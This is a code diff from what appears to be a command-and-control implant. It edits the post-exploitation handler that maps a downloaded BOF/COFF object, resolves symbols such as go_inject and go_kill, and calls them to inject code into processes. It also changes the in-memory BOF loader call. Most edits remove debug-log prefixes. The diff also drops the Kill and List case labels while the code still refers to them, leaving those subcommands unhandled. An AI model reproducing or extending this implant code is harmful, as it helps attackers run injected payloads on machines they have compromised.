@@ -119,46 +119,45 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 auto DECLFN Task::Postex(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    KhDbg("[Task::Postex] ENTER - Job UUID: %s", Job->UUID);
+    KhDbg("ENTER - Job UUID: %s", Job->UUID);
 
     PARSER*  Parser  = Job->Psr;
     PACKAGE* Package = Job->Pkg;
 
-    KhDbg("[Task::Postex] Parser: %p, Package: %p", Parser, Package);
-    KhDbg("[Task::Postex] Parser->Buffer: %p, Parser->Length: %d", Parser ? Parser->Buffer : nullptr, Parser ? Parser->Length : 0);
-    KhDbg("[Task::Postex] Parser Endian flag: %d", Self->Psr->Endian);
+    KhDbg("Parser: %p, Package: %p", Parser, Package);
+    KhDbg("Parser->Buffer: %p, Parser->Length: %d", Parser ? Parser->Buffer : nullptr, Parser ? Parser->Length : 0);
 
     ULONG SubCmd = Self->Psr->Int32( Parser );
 
-    KhDbg("[Task::Postex] SubCmd: %d", SubCmd);
+    if ( ! SubCmd ) SubCmd = Self->Postex.SubId;
 
     Self->Pkg->Int32( Package, SubCmd );
 
-    if ( !SubCmd ) SubCmd = Self->Postex.SubId;
+    KhDbg("SubCmd: %d", SubCmd);
 
     switch ( (Action::Postex)SubCmd ) {
 
     case Action::Postex::Inject: {
-        KhDbg("[Task::Postex::Inject] ENTER");
-        KhDbg("[Task::Postex::Inject] Parser before Bytes: Buffer=%p, Length=%d", Parser->Buffer, Parser->Length);
+        KhDbg("ENTER");
+        KhDbg("Parser before Bytes: Buffer=%p, Length=%d", Parser->Buffer, Parser->Length);
 
         ULONG BofLen  = 0;
         PBYTE BofData = Self->Psr->Bytes( Parser, &BofLen );
 
-        KhDbg("[Task::Postex::Inject] BofData: %p, BofLen: %d, IsLoaded: %d", BofData, BofLen, Self->Postex.IsLoaded);
+        KhDbg("BofData: %p, BofLen: %d, IsLoaded: %d", BofData, BofLen, Self->Postex.IsLoaded);
 
         if ( BofLen > 0 && !Self->Postex.IsLoaded ) {
-            KhDbg("[Task::Postex::Inject] First time loading PostexKit");
+            KhDbg("First time loading PostexKit");
 
             Self->Postex.Mapped = (COFF_MAPPED*)KhAlloc( sizeof(COFF_MAPPED) );
 
             if ( !Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
-                KhDbg("[Task::Postex::Inject] ERROR: Failed to map BOF");
+                KhDbg("ERROR: Failed to map BOF");
                 Self->Pkg->Int32( Package, 0 );
                 return KhGetError;
             }
 
-            KhDbg("[Task::Postex::Inject] BOF mapped successfully");
+            KhDbg("BOF mapped successfully");
 
             PCHAR symbols[] = {
                 (PCHAR)"go_inject", (PCHAR)"go_poll",  (PCHAR)"go_kill",
@@ -174,7 +173,7 @@ auto DECLFN Task::Postex(
                 *targets[i] = Self->Cf->FindSymbol( Self->Postex.Mapped, symbols[i] );
             }
 
-            KhDbg("[Task::Postex::Inject] Symbols: inject=%p, poll=%p, kill=%p, list=%p, cleanup=%p",
+            KhDbg("Symbols: inject=%p, poll=%p, kill=%p, list=%p, cleanup=%p",
                 Self->Postex.fn_inject, Self->Postex.fn_poll, Self->Postex.fn_kill,
                 Self->Postex.fn_list, Self->Postex.fn_cleanup);
 
@@ -183,7 +182,7 @@ auto DECLFN Task::Postex(
         }
 
         if ( !Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
-            KhDbg("[Task::Postex::Inject] ERROR: Not loaded or fn_inject is null (IsLoaded=%d, fn_inject=%p)",
+            KhDbg("ERROR: Not loaded or fn_inject is null (IsLoaded=%d, fn_inject=%p)",
                 Self->Postex.IsLoaded, Self->Postex.fn_inject);
             Self->Pkg->Int32( Package, 0 );
             return KhGetError;
@@ -192,11 +191,11 @@ auto DECLFN Task::Postex(
         ULONG ArgsLen = 0;
         PBYTE Args    = (PBYTE)Self->Psr->Bytes( Parser, &ArgsLen );
 
-        KhDbg("[Task::Postex::Inject] Calling go_inject with Args=%p, ArgsLen=%d", Args, ArgsLen);
+        KhDbg("Calling go_inject with Args=%p, ArgsLen=%d", Args, ArgsLen);
 
         ((BOOL(*)(char*, int))Self->Postex.fn_inject)( (char*)Args, ArgsLen );
 
-        KhDbg("[Task::Postex::Inject] go_inject returned");
+        KhDbg("go_inject returned");
         Self->Pkg->Int32( Package, 1 );
 
         Self->Postex.SubId = (INT32)Action::Postex::Poll;
@@ -205,19 +204,19 @@ auto DECLFN Task::Postex(
     }
 
     case Action::Postex::Poll: {
-        KhDbg("[Task::Postex::Poll] ENTER (IsLoaded=%d, fn_poll=%p)", Self->Postex.IsLoaded, Self->Postex.fn_poll);
+        KhDbg("ENTER (IsLoaded=%d, fn_poll=%p)", Self->Postex.IsLoaded, Self->Postex.fn_poll);
 
         if ( !Self->Postex.IsLoaded || !Self->Postex.fn_poll ) {
-            KhDbg("[Task::Postex::Poll] Not loaded, marking job for cleanup");
+            KhDbg("Not loaded, marking job for cleanup");
             Job->Clean = TRUE;
             return KhRetSuccess;
         }
 
-        KhDbg("[Task::Postex::Poll] Calling go_poll");
+        KhDbg("Calling go_poll");
 
         BOOL clean = ((BOOL(*)(char*, int))Self->Postex.fn_poll)( nullptr, 0 );
 
-        KhDbg("[Task::Postex::Poll] go_poll returned to clean %s", clean ? "TRUE" : "FALSE");
+        KhDbg("go_poll returned to clean %s", clean ? "TRUE" : "FALSE");
 
         if ( clean ) {
             Self->Cf->Unmap( Self->Postex.Mapped );
@@ -232,10 +231,8 @@ auto DECLFN Task::Postex(
         break;
     }
 
-    case Action::Postex::Kill:
-    case Action::Postex::List:
     case Action::Postex::Cleanup: {
-        KhDbg("[Task::Postex::%s] ENTER", 
+        KhDbg("ENTER", 
             SubCmd == (ULONG)Action::Postex::Kill ? "Kill" : 
             SubCmd == (ULONG)Action::Postex::List ? "List" : "Cleanup");
 
@@ -249,29 +246,29 @@ auto DECLFN Task::Postex(
         }
 
         if ( !Self->Postex.IsLoaded || !fn ) {
-            KhDbg("[Task::Postex] ERROR: Not loaded or fn is null");
+            KhDbg("ERROR: Not loaded or fn is null");
             return KhGetError;
         }
 
         PBYTE Args    = (SubCmd == (ULONG)Action::Postex::Kill) ? (PBYTE)Parser->Buffer : nullptr;
         ULONG ArgsLen = (SubCmd == (ULONG)Action::Postex::Kill) ? Parser->Length : 0;
 
-        KhDbg("[Task::Postex] Calling subcmd %d with Args=%p, ArgsLen=%d", SubCmd, Args, ArgsLen);
+        KhDbg("Calling subcmd %d with Args=%p, ArgsLen=%d", SubCmd, Args, ArgsLen);
 
         ((void(*)(char*, int))fn)( (char*)Args, ArgsLen );
 
-        KhDbg("[Task::Postex] subcmd %d returned", SubCmd);
+        KhDbg("subcmd %d returned", SubCmd);
         break;
     }
 
     default: {
-        KhDbg("[Task::Postex] ERROR: Unknown SubCmd: %d", SubCmd);
+        KhDbg("ERROR: Unknown SubCmd: %d", SubCmd);
         break;
     }
 
     }
 
-    KhDbg("[Task::Postex] EXIT");
+    KhDbg("EXIT");
     return KhRetSuccess;
 }
 
@@ -294,7 +291,7 @@ auto DECLFN Task::ExecBof(
 
     Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );
 
-    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );
+    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc );
 
     if ( Success ) {
         return KhRetSuccess;
